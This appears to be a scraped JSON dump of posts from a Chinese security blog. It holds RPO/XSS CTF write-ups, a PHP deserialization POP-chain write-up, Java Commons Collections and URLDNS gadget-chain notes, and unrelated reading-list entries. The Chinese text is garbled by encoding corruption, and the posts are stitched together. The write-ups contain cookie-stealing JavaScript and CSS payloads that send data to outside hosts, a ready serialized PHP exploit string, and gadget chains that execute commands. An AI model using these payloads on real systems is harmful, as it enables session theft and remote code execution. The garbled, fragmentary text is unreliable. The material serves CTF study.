æµè§ˆå™¨åˆ™ä¼šå°è¯•å¼•å…¥http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2fstatic/js/jquery.min.jsï¼Œè€Œè¿™ä¸ªurlè¯·æ±‚çš„é¡µé¢å®é™…ä¸Šè¿˜æ˜¯æˆ‘ä»¬çš„Noteï¼Œä¹Ÿå°±æ˜¯noteå†…å®¹å°†ä½œä¸ºjquery.min.jsè¢«å¼•å…¥é¡µé¢ï¼Œå¦‚æœnoteéƒ¨åˆ†æ˜¯payloadï¼Œé‚£ä¹ˆè®¿é—®http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2få°±ä¼šæ‰§è¡Œ\næˆ‘ä»¬å¯ä»¥æ„é€ ç±»ä¼¼è¿™æ ·çš„payloadæ¥å·cookie\n(new Image()).src=\u0026#39;http://vps-ip:port/?cookie=\u0026#39;+document.cookie é¡µé¢å¯¹å¼•å·åšäº†è½¬ä¹‰ï¼Œæˆ‘ä»¬ç”¨String.fromCharCode\n(new Image()).src = String.fromCharCode(104,116,116,112,58,47,47,55,101,52,122,119,48,99,101,121,101,46,105,111,63)+document.cookie; cookieæç¤ºæˆ‘ä»¬æ‰“å¦ä¸€ä¸ªç›®å½•ï¼Œæ„é€ exp\nvar iframe = document.createElement(String.fromCharCode(105,102,114,97,109,101)); iframe.src = String.fromCharCode(47,81,87,66,95,102,108,52,103,47,81,87,66,47); iframe.id = String.fromCharCode(102,114,97,109,101); document.body.appendChild(iframe); iframe.onload = function (){ var c = document.getElementById(String.fromCharCode(102,114,97,109,101)).contentWindow.document.cookie; var y1r0nz = document.createElement(String.fromCharCode(108,105,110,107)); y1r0nz.setAttribute(String.fromCharCode(114,101,108),String.fromCharCode(112,114,101,102,101,116,99,104)); y1r0nz.setAttribute(String.fromCharCode(104,114,101,102), String.fromCharCode(47,47,55,101,52,122,119,48,46,99,101,121,101,46,105,111,47,63,102,108,97,103,61) + c); document.head.appendChild(y1r0nz); } ç»è¿‡æµè§ˆå™¨æ¸²æŸ“ä»¥åå°±æ˜¯ä¸‹è¿°çš„ä¸¤è¡Œhtmlä»£ç \n\u0026lt;iframe id=\u0026#34;frame\u0026#34; src=\u0026#34;/QWB_fl4g/QWB/\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;http://7e4zw0.ceye.io/?flag=document.getElementById(frame).contentWindow.document.cookie\u0026#34;\u0026gt; prefetchå±æ€§è§„å®šäº†å½“å‰æ–‡æ¡£åœ¨é“¾æ¥æ–‡æ¡£ä¹‹å‰è¢«è°ƒç”¨ï¼Œè¿™æ ·å°±å¯ä»¥å¤–å¸¦å¯¹åº”è·¯å¾„ä¸‹çš„cookieäº†\n[pwnhub 0618]å¤§ç‰©å¿…é¡»è¿‡ wp | wp2\nreport_bug.phpé¡µé¢å¯ä»¥æäº¤linkï¼Œclasses.phpé¡µé¢å¼•å…¥cssæ—¶ä½¿ç”¨äº†ç›¸å¯¹è·¯å¾„è¿›è¡ŒåŠ è½½\n\u0026lt;linkrel=\u0026#34;stylesheet\u0026#34;type=\u0026#34;text/css\u0026#34;href=\u0026#34;../../classes.css\u0026#34;\u0026gt; ä¸ä¸Šé¢çš„æ€è·¯ç›¸åŒï¼Œpayload\nhttp://52.80.19.55/user.php/69/0/..%2f..%2f..%2fclasses.php/0 å½“è®¿é—®è¿™ä¸ªurlæ—¶ï¼Œclasses.cssä¼šè¢«/user.php/69å¯¹åº”çš„å†…å®¹æ‰€è¦†ç›–\nè‡³äºpayloadçš„å†…å®¹ï¼Œä¸åŒäºæˆ‘ä»¬å¸¸è§çš„js payload\n*{}*{background-image:url(http://vpsip);}*{} [36c3CTF 2018]urlstorage dockerfile | wp ï¼ˆç”±äºdockerfileç”¨çš„ubuntu17 æ— æ³•å¤ç°ï¼‰\né¡µé¢çš„cssåŠ è½½ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼ˆå¯ä»¥è¿›è¡Œrpo æ§åˆ¶cssï¼‰ï¼Œcspä¿¡æ¯å¦‚ä¸‹\nframe-ancestors \u0026#39;none\u0026#39;; form-action \u0026#39;self\u0026#39;; connect-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39;; font-src \u0026#39;self\u0026#39; ; style-src \u0026#39;self\u0026#39;; /urlstorageå¤„å¯ä»¥æäº¤nameå’Œurlï¼Œå­˜åœ¨csrfï¼ˆå¯ä»¥ä»»æ„ä¿®æ”¹ä»–äººçš„urlï¼‰\n/flag?token=xxxå¤„å­˜åœ¨xss\næ€è·¯ï¼šé€šè¿‡å¯ä»¥è¦†ç›–çš„cssä¿¡æ¯æ¨¡ç³ŠåŒ¹é…/çˆ†ç ´å‡ºflag\né¦–å…ˆæ˜¯çˆ†ç ´tokenï¼Œç¬¬ä¸€ä½å­—ç¬¦ï¼š\na[href^=flag\\?token\\=0]{background: url(//xxx.pw/rpo/?c=1);} a[href^=flag\\?token\\=1]{background: url(//xxx.pw/rpo/?c=1);} ... a[href^=flag\\?token\\=f]{background: url(//xxx.pw/rpo/?c=f);} ç¬¬äºŒä½å­—ç¬¦ï¼š\na[href^=flag\\?token\\=10]{background: url(//xxx.pw/rpo/?c=10);} a[href^=flag\\?token\\=11]{background: url(//xxx.pw/rpo/?c=11);} åŒ¹é…flagæ—¶çš„å‘ç‚¹åœ¨äºcssé€‰æ‹©å™¨åœ¨åŒ¹é…çš„æ—¶å€™é¦–å­—ç¬¦ä¸èƒ½æ˜¯æ•°å­—ï¼Œè€Œflagçš„å¼€å¤´ä¸º34c3ï¼Œæ‰€ä»¥ä½¿ç”¨cssçš„æ¨¡ç³ŠåŒ¹é…\n#flag[value*=C3_1]{background: url(http://xxx.pw/?flag=C3_1);} æˆ–è€…16è¿›åˆ¶ç¼–ç \n#flag[value^=\\33\\34\\43\\33]{background: url(http://xxx.pw/?34c3);} ä¹‹ååˆ©ç”¨ä¹‹å‰çš„xssç‚¹ä¿®æ”¹baseæ ‡ç­¾è¿›è¡Œrpoï¼Œè·å–flag\nhttp://192.168.42.134:8080/flag?token=cdebcc090a8b4e339b876c33ad1c0acb%3C/title%3E%3Cbase%20href=urlstorage/123%3E ","date":"2022-04-24T21:39:29+08:00","permalink":"https://amiaaaz.github.io/2022/04/24/rpo-attack-study-notes/","section":"posts","tags":["RPO"],"title":"RPOæ”»å‡»å­¦ä¹ ç¬”è®°"},{"categories":[],"contents":"å…³äºæ¯é›†çš„ç®€è¯„åœ¨è¿™ä¸ªçŸ¥ä¹å›ç­”ä¸­ link_here\nå¾…æ›´æ–°\n","date":"2022-04-24T15:10:07+08:00","permalink":"https://amiaaaz.github.io/relax/goodbye-villanelle/","section":"relax","tags":[],"title":"Killing Eveå®Œç»“éšç¬”"},{"categories":[],"contents":" ã€Šå¹¸ç¦çš„å‹‡æ°”ã€‹å²¸è§ä¸€éƒ/å¤è´ºå²å¥ â­ â­ â­ â­ â­ ä½œä¸ºã€Šè¢«è®¨åŒçš„å‹‡æ°”ã€‹çš„å§Šå¦¹ç¯‡ï¼Œä»æ—§æ˜¯é€šè¿‡å¯¹è¯çš„å½¢å¼æ·±å…¥æµ…å‡ºçš„è®²è¿°é˜¿å¾·å‹’å¿ƒç†å­¦ã€‚å¯¹æˆ‘å¸®åŠ©æœ€å¤§çš„æ˜¯ç¬¬ä¸€ç« çš„â€œæ— æ³•æ”¹å˜çš„çœŸæ­£ç†ç”±â€ã€â€œä½ çš„ç°åœ¨å†³å®šäº†è¿‡å»â€å’Œâ€œå¯æ¶çš„ä»–äººï¼Œå¯æ€œçš„è‡ªå·±â€è¿™å‡ èŠ‚ã€‚äººç”Ÿæœ€å¤§çš„è¯¾é¢˜æ˜¯è®¤æ¸…ä¸–ç•Œåä¸è‡ªå·±å’Œè§£\nã€Šæ¶ˆå¤±çš„13çº§å°é˜¶ã€‹é«˜é‡å’Œæ˜ â­ â­ â­ ä¹¦å°æœ‰è¯´æ˜¯â€œç½—ç¿”æ¨èâ€ï¼Œçœ‹å®Œåæˆ‘æ‰æ„è¯†åˆ°å—åˆ°æ¨èçš„åŸå› æ˜¯é‡Œé¢æ¶‰åŠåˆ°äº†ä¸€äº›å…³äºâ€œæ˜¯å¦åºŸé™¤æ­»åˆ‘â€çš„è®¨è®ºï¼Œè€Œåœ¨æ¨ç†å°è¯´çš„æ ¸å¿ƒè°œé¢˜ä¸è¯¡è®¡ä¸Šåœ¨æˆ‘çœ‹æ¥å¹¶ä¸ååˆ†å‡ºå½©\nã€Šå…‹è±å› å£¶ã€‹ å†ˆå²›äºŒäºº â­ â­ â­ â­ â­ éå¸¸æ£’çš„ç§‘å¹»æ‚¬ç–‘å°è¯´ï¼è™½ç„¶æˆä¹¦æ—¶é—´éå¸¸æ—©ï¼Œä½†çœ‹çš„æ—¶å€™ä¸€ç‚¹éƒ½ä¸ä¼šè§‰å¾—è¿‡æ—¶ã€‚ä¸»è¦å†…å®¹å¯ä»¥ç±»æ¯”ã€Šç›—æ¢¦ç©ºé—´ã€‹ï¼Œè™½ç„¶ä¸åŠè¯ºå…°ç”µå½±é‚£æ ·çš„å†²å‡»åŠ›ï¼Œä½†æ–‡å­—ä»ç„¶å€¼å¾—ä¸€çœ‹ï¼Œéå¸¸æ£’\nã€Šæ²‰é»˜çš„å¤§å¤šæ•°ã€‹ ç‹å°æ³¢ â­ â­ â­ â­ â­ å‰ä¸ä¹…æ˜¯ç‹å°æ³¢é€ä¸–25å‘¨å¹´ï¼Œä¹‹å‰ä¹Ÿåªæ˜¯ç†Ÿåå­—ä¸ç†Ÿä½œå“ï¼Œäºæ˜¯æ¡èµ·ä¸€æœ¬æ¥çœ‹ï¼Œåªèƒ½è¯´çˆ±æƒ¨äº†ã€‚æ‚æ–‡æœ‰ä¸€è‚¡é²è¿…å…ˆç”Ÿçš„é£éª¨åœ¨å…¶ä¸­ï¼ŒåŒæ—¶å……æ»¡äº†é»‘è‰²å¹½é»˜ï¼Œæ¯ç¿»å‡ é¡µéƒ½ä¼šæœ‰è®©æˆ‘æ§è…¹çš„ç‰‡æ®µå‡ºç°ï¼Œå¯¹äºç°å®é—®é¢˜çš„æ€è€ƒå’Œæ‰¹åˆ¤æ›´æ˜¯ä¸ç•™æƒ…é¢ï¼Œè§’åº¦çŠ€åˆ©ï¼›ä¹‹åä¼šçœ‹æ›´å¤šç‹å°æ³¢çš„ä¹¦\nã€Šèµ°åœ¨äººç”Ÿè¾¹ä¸Šã€‹æ¨ç»› â­ â­ â­ â­ æ¨ç»›å…ˆç”Ÿä¹åå¤šå²æ—¶å†™çš„ï¼Œè¯»çš„æ—¶å€™å°±åƒè€è€…åœ¨èº«è¾¹è°†è°†æ•™è¯²ï¼Œå¤©ç„¶å°±æœ‰è®©äººæ”¾æ¾çš„å¥‡æ•ˆ\n","date":"2022-04-24T15:04:31+08:00","permalink":"https://amiaaaz.github.io/relax/march-april-reading-list/","section":"relax","tags":[],"title":"3,4æœˆä¹¦å•"},{"categories":["CTF"],"contents":"easy unserialize ä¸€ä¸ªpopé“¾çš„æ„é€ å’Œthrow errorçš„ç»•è¿‡\n\u0026lt;?php $talk = \u0026#39;111\u0026#39;; $flag = \u0026#39;flag{here}\u0026#39;; class one { public $object; // new second(); public function MeMeMe() { array_walk($this, function($fn, $prev){ if ($fn[0] === \u0026#34;Happy_func\u0026#34; \u0026amp;\u0026amp; $prev === \u0026#34;year_parm\u0026#34;) { echo \u0026#39;success\u0026#39;; global $talk; echo \u0026#34;$talk\u0026#34;.\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; global $flag; echo $flag; // get flag here [7] } }); } public function __destruct() { @$this-\u0026gt;object-\u0026gt;add(); // second::__call [1] } public function __toString() { return $this-\u0026gt;object-\u0026gt;string; // third::__get [4] } } class second { protected $filename; // new one(); public function __construct($filename){ $this-\u0026gt;filename = $filename; } protected function addMe() { return \u0026#34;Wow you have sovled\u0026#34;.$this-\u0026gt;filename; // one::__toString [3] } public function __call($func, $args) { // ä¸å­˜åœ¨æ–¹æ³• call_user_func([$this, $func.\u0026#34;Me\u0026#34;], $args); // second::addMe [2] // one::MeMeMe [6] } } class third { private $string; public function __construct($string) {\t// æ„é€ popæ—¶æ³¨æ„æ‰‹åŠ¨æ·»åŠ è¿™ä¸ªæ„é€ æ–¹æ³• æˆ–è€…ç›´æ¥èµ‹å€¼ä¹Ÿå¯ $this-\u0026gt;string = $string; } public function __get($name) { // ä¸å­˜åœ¨å±æ€§ $var = $this-\u0026gt;$name; $var[$name](); // second::__call [5] } } $one = new one(); $one2 = new one(); $one3 = new one(); $third = new third([\u0026#39;string\u0026#39;=\u0026gt;[$one3, \u0026#39;MeMeMe\u0026#39;]]); $one2-\u0026gt;object = $third; $second = new second($one2); $one3-\u0026gt;year_parm = [\u0026#39;Happy_func\u0026#39;]; $one-\u0026gt;object = $second; // unserialize(serialize($one)); $r = [$one, null]; echo urlencode(serialize($r)); ä¿®æ”¹i:0\na%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A0%3BN%3B%7D easyweb é¡µé¢æºç æç¤º/?source\n\u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;source\u0026#39;])){ highlight_file(__FILE__); echo \u0026#34;\\$flag_filename = \u0026#39;flag\u0026#39;.md5(???).\u0026#39;php\u0026#39;;\u0026#34;; die(); } if(isset($_POST[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;b\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;c\u0026#39;])){ $c = $_POST[\u0026#39;c\u0026#39;]; $count[++$c] = 1; if($count[] = 1) {\t// ??? $count[++$c] = 1; print_r($count); die(); }else{ $a = $_POST[\u0026#39;a\u0026#39;]; $b = $_POST[\u0026#39;b\u0026#39;]; echo new $a($b);\t// åŸç”Ÿç±» } } ?\u0026gt; åŸç”Ÿç±»æˆ‘çŸ¥é“ï¼Œä½†æ˜¯æˆ‘æ³¨é‡Š???çš„åœ°æ–¹å¡äº†å¥½ä¹…ï¼Œåæ¥çŸ¥é“è¿™é‡Œè€ƒçš„æ˜¯æ•°ç»„æº¢å‡ºï¼ˆæ·¦\nc=9223372036854775806\u0026amp;a=DirectoryIterator\u0026amp;b=glob://flag[0-9a-z]*.php c=9223372036854775806\u0026amp;a=SplFileObject\u0026amp;b=flag56ea8b83122449e814e0fd7bfb5f220a.php ä¸æ‘†çƒ‚ä»æˆ‘åšèµ·ï¼ˆx\n","date":"2022-03-28T10:04:27+08:00","permalink":"https://amiaaaz.github.io/2022/03/28/ctfshow-0222-juanwangcup-wp/","section":"posts","tags":["wp"],"title":"CTFshow0222å·ç‹æ¯ Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"åºåˆ—åŒ–\u0026amp;ååºåˆ—åŒ– ä¸PHPç±»ä¼¼ï¼Œjavaçš„readObjectå¯¹æ ‡__wakeupï¼Œä½†ä¸å®Œå…¨ä¸€æ ·ï¼ŒreadObjectå€¾å‘äºè§£å†³â€œååºåˆ—åŒ–æ—¶å¦‚ä½•è¿˜åŸä¸€ä¸ªå®Œæ•´å¯¹è±¡â€è¿™ä¸ªé—®é¢˜ï¼Œè€ŒPHPçš„__wakeupå€¾å‘äºè§£å†³â€œååºåˆ—åŒ–åå¦‚ä½•åˆå§‹åŒ–è¿™ä¸ªå¯¹è±¡â€çš„é—®é¢˜ï¼Œå®ƒå¯ä»¥åœ¨ååºåˆ—åŒ–ä¹‹åæ‰§è¡Œåˆå§‹åŒ–æ“ä½œï¼Œè¯¥èµ‹çš„å€¼åŸºæœ¬ç”±__constructæ§åˆ¶ï¼ŒçœŸæ­£çš„å…¥æ‰‹ç‚¹ä¸€èˆ¬åœ¨__destructä¸­\nå¯¹javaæ¥è¯´ï¼Œä¸€ä¸ªå¯åˆ©ç”¨çš„readObjectæ˜¯é“¾å­æœ€åˆçš„èµ·ç‚¹\nåœ¨åºåˆ—åŒ–å¯¹è±¡æ—¶ä¼šè°ƒç”¨å¯¹è±¡çš„writeObjectæ–¹æ³•ï¼Œå‚æ•°ç±»å‹æ˜¯ObjectOutputStreamï¼Œè¿™ä¸ªç±»æœ‰ä¸€ä¸ªannotateClassæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡é‡å†™è¿™ä¸ªæ–¹æ³•æ¥å‘åºåˆ—åŒ–åçš„æ•°æ®ä¸­å†™å…¥å†…å®¹ï¼Œè¿™ä¸ªå†…å®¹ä½äºobjectAnnotationä¸­\nç›¸åº”çš„ï¼Œååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨readObjectï¼Œå¯ä»¥è¯»å‡ºå‰é¢å†™å…¥çš„å†…å®¹è¿›è¡Œå¤„ç†\npythonçš„ååºåˆ—åŒ–å±å®³æœ€å¤§ï¼Œå¯ä»¥ç›´æ¥æ“æ§PVMæ ˆä¸Šçš„æŒ‡ä»¤\nURLDNS public class URLDNS implements ObjectPayload\u0026lt;Object\u0026gt; { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } /** * \u0026lt;p\u0026gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.\u0026lt;/p\u0026gt; * * \u0026lt;b\u0026gt;Potential false negative:\u0026lt;/b\u0026gt; * \u0026lt;p\u0026gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.\u0026lt;/p\u0026gt; */ static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } è¿™æ˜¯yoserialä¸­URLDNSéƒ¨åˆ†çš„æºç ï¼Œå¾ˆçŸ­\næ•´ä¸ªé“¾å­çš„æ”»å‡»åˆ©ç”¨çš„æ˜¯HashMapä¼šè°ƒç”¨keyçš„hashCodeæ–¹æ³•æ¥å®šä½å¯¹åº”çš„valueï¼Œå½“url objectä½œä¸ºkeyæ—¶ä¼šç”±äºhashCodeçš„è®¡ç®—è¿›è€Œè§¦å‘DNSè¯·æ±‚ï¼ˆå› ä¸ºè¦è§£æhostnameæ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªIp\nHashMap private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { ObjectInputStream.GetField fields = s.readFields(); // Read loadFactor (ignore threshold) float lf = fields.get(\u0026#34;loadFactor\u0026#34;, 0.75f); if (lf \u0026lt;= 0 || Float.isNaN(lf)) throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); HashMap.UnsafeHolder.putLoadFactor(this, lf); reinitialize(); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal mappings count: \u0026#34; + mappings); } else if (mappings == 0) { // use defaults } else if (mappings \u0026gt; 0) { float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u0026lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; ft \u0026lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what we\u0026#39;re actually creating. SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\u0026#34;rawtypes\u0026#34;,\u0026#34;unchecked\u0026#34;}) Node\u0026lt;K,V\u0026gt;[] tab = (Node\u0026lt;K,V\u0026gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } è¿™æ˜¯å®ƒé‡å†™çš„readObjectæ–¹æ³•ï¼Œåœ¨æœ€åä¸€è¡Œå¯¹keyè®¡ç®—hashå€¼ï¼Œä¼šè§¦å‘hashCodeæ–¹æ³•ï¼Œè€Œè®¡ç®—hashCodeæ—¶ä¼šè§¦å‘DNSçš„è¯·æ±‚\næ„é€ é“¾å­æ—¶æˆ‘ä»¬éœ€è¦åˆå§‹åŒ–ä¸€ä¸ªjava.net.URLå¯¹è±¡ä½œä¸ºHashMapçš„keyï¼Œä¹‹åå°†è¿™ä¸ªå¯¹è±¡çš„hashCodeè®¾ä¸º-1ï¼Œå¼ºåˆ¶åœ¨ååºåˆ—åŒ–æ—¶é‡æ–°è®¡ç®—hashCodeï¼Œè§¦å‘åç»­è°ƒç”¨\nå¦å¤–åœ¨ysoserialçš„payloadç”Ÿæˆæ—¶ä¸ºäº†é˜²æ­¢æ‰§è¡ŒDNSè¯·æ±‚ï¼Œä½¿ç”¨äº†SilentURLStreamHandler\nCC1(\u0026lt;8u71 åœ¨pç‰›çš„javaå®‰å…¨æ¼«è°ˆä¸­ç»™å‡ºäº†CC1çš„æç®€ç‰ˆdemo\npublic class testCC1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;amiz\u0026#34;); } } å‰ç½® é¦–å…ˆç†è§£ä¸€ä¸‹æ²¡è§è¿‡çš„å‡ ä¸ªå‡½æ•°\nTransformer ä¸€ä¸ªæ¥å£ï¼Œåªæœ‰ä¸€ä¸ªå¾…å®ç°çš„transformæ–¹æ³•\npublic interface Transformer{ public Object transform(Object input); } TransformedMap TransformedMapå¯¹innerMapä½œäº†ä¿®é¥°ï¼Œä¼ å‡ºçš„outerMapæ˜¯ä¿®é¥°åçš„M\nMap outerMap = TransformedMap.decorate(innerMap, KeyTransformer, valueTransformer); keyTransformeræ˜¯å¤„ç†æ–°å…ƒç´ keyçš„å›è°ƒï¼ŒvalueTransformeræ˜¯å¤„ç†æ–°å…ƒç´ valueçš„å›è°ƒï¼›è¿™é‡Œçš„å›è°ƒå¹¶ä¸æ˜¯å›è°ƒå‡½æ•° è€Œæ˜¯ä¸€ä¸ªå®ç°äº†ä¸Šé¢Transformeræ¥å£çš„ç±»\nConstantTransformer public ConstantTransformer(Object constantToReturn){ super(); iConstant = constantToReturn; } public Object transform(Object input){ return iConstant; } æ˜¯ä¸€ä¸ªå®ç°äº†Transformeræ¥å£çš„ç±»ï¼Œå®ƒçš„è¿‡ç¨‹ç±»ä¼¼æ„é€ å‡½æ•°æ—¶ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨transformæ–¹æ³•ä¸­å°†è¿™ä¸ªå¯¹è±¡è¿”å›ï¼Œä½œç”¨æ˜¯åŒ…è£…ä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æ‰§è¡Œå›è°ƒæ—¶è¿”å›è¿™ä¸ªå¯¹è±¡ï¼Œæ–¹ä¾¿åç»­æ“ä½œ\nInvokerTransformer ä¹Ÿæ˜¯ä¸€ä¸ªå®ç°äº†Transformeræ¥å£çš„ç±»ï¼Œç±»å¯ä»¥ç”¨æ¥æ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯ååºåˆ—åŒ–èƒ½RCEçš„å…³é”®\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args){ super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¾…æ‰§è¡Œçš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªæ˜¯ä¼ å…¥çš„å‚æ•°\nä¹‹åçš„å›è°ƒtransformæ–¹æ³•æ‰§è¡Œinputå¯¹è±¡çš„iMethodNameæ–¹æ³•\npublic Object transform(Object input){ if(input == null){ return null; } try{ Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); }catch(NoSuchMethodException ex){ throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; does not exist\u0026#34;); }catch(IllegalAccessException ex){ throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; cannot be accessed\u0026#34;); }catch(InvocationTargetException ex){ throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; threw an exception\u0026#34;, ex); } } ChainedTransformer ä¹Ÿæ˜¯ä¸€ä¸ªå®ç°äº†Transformeræ¥å£çš„ç±»ï¼Œä½œç”¨æ˜¯å°†å†…éƒ¨å¤šä¸ªTransformerä¸²åœ¨ä¸€èµ·\npublic ChainedTransformer(Transformer[] transformers){ super(); iTransformers = transformers; } public Object transform(Object object){ for(int i = 0; i \u0026lt; iTransformers.length; i++){ object = iTransformers[i].transform(object); } return object; } å‰ä¸€ä¸ªå›è°ƒè¿”å›çš„ç»“æœå¯ä»¥ä½œä¸ºåä¸€ä¸ªå›è°ƒçš„å‚æ•°ä¼ å…¥\ndemo ç„¶åå†æ¥çœ‹demo\npublic class testCC1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;amiz\u0026#34;); } } æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªChainedTransformerï¼ŒåŒ…å«ConstantTransformerï¼ˆå¾—åˆ°Runtimeå¯¹è±¡ï¼‰å’ŒInvokerTransformerï¼ˆæ‰§è¡Œä»£ç éƒ¨åˆ†ï¼‰ï¼Œè¿™ä¸ªChainedTransformeråªæ˜¯ä½œä¸ºå›è°ƒéƒ¨åˆ†ï¼Œæˆ‘ä»¬ç”¨TransformedMap.decorateå¯¹å®ƒè¿›è¡ŒåŒ…è£…ï¼Œæœ€åé€šè¿‡outerMap.put å‘Mapä¸­æ”¾å…¥æ–°å…ƒç´ è§¦å‘å›è°ƒï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤\nTransformedMap package ysoserial.payloads; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.Map; public class testCC1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[]{\u0026#34;calc.exe\u0026#34;} ), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); 